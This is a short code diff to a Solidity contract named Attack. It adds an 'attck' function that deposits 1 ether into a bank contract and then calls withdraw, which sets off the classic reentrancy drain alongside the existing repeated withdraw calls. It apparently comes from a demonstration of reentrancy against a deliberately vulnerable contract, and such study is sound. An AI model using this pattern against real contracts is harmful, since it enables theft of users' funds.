@@ -33,4 +33,10 @@ contract Attack {
             bank.withdraw();
         }
     }
+
+    function attck() external payable {
+        require(msg.value == 1 ether , "Require 1 Ether to attack");
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
+    }
 }
